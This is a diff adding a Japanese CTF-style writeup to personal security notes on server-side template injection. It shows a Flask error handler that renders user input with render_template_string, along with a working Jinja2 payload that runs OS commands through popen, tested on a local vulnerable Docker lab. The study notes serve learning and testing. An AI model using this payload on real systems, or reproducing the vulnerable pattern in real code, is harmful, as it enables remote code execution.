@@ -963,6 +963,55 @@ http://192.168.99.100:15004/ejs?inj=<%- global.process.mainModule.require('child
 ugOlkb8cWen3RKy5jmT3DZoF7bWwJ5Oauid=0(root) gid=0(root) groups=0(root)
 UqfIaDZlPpRDsVBvEz04ssis4YEBwPkl
 ```
+# writeup
+## sample
+https://caya8.hatenablog.com/entry/2020/07/16/083000   
+- **entrypoint**    
+Flaskのencode,decodeをするWebページがある。encode,decodeにはPOSTで`mode=encode`みたいに指定するが、encodeもdecodeも指定しない場合はエラーページを入力を含めて返す。ここのJinja2の`render_template_string`にSSTIがある。   
+- **概要**    
+以下の場所にSSTIできる！エラーを発生させて、その内容をSSTIするてきな？   
+```python
+if mode not in ['encode', 'decode']:
+    abort(500, description=f'invalid mode ({mode=}) specified')
+    
+@app.errorhandler(500)
+def internal_server_error(e):
+    mascot = random.choice(list('🐌🐛🦟🐜🐝🐞🦂🦗🦋🕷'))  # just choose a mascot
+    return render_template_string(f'{mascot} < {e.description}'), 500
+```
+- **Payload**    
+`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`とかでRCEできるらしい！今回は同じ`render_template_string`を使っているwebsitesVulnerableToSSTIの以下の`python-jinja2`のやつを使った。   
+https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/python/python-jinja2/src/server.py   
+以下でDocker環境を構築。   
+```txt
+tomok@LAPTOP-KSRL4PAP MINGW64 ~/docker_work/websitesVulnerableToSSTI/python/python-jinja2 (master)
+$ bash runInDocker.sh 0.0.0.0
+```
+`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`でいけた！   
+![image](https://user-images.githubusercontent.com/56021519/102914001-fc2bb880-44c2-11eb-8303-5cd2b4ca0641.png)   
+`<pre>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}<!--`として`<pre>`を先頭につけて、末尾に`<!--`を付けると出力が綺麗になる。   
+![image](https://user-images.githubusercontent.com/56021519/102914209-46149e80-44c3-11eb-892b-36ef254f6cff.png)   
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
+
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
+
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
+
+
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
+
 # メモ
 escapeHTMLってどんな感じでエスケープする？   
 動的な文字列連結は脆弱になりがちっぽい   
